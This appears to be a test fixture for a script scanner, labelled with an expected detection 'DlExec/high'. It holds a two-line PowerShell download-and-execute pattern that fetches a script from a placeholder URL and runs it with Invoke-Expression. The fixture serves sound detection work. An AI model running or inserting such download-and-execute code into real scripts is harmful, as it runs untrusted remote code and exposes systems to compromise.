# expect: DlExec/high
# url: https://example.com/e.ps1
$u = 'https://example.com/e.ps1'
Invoke-Expression (Invoke-RestMethod $u)
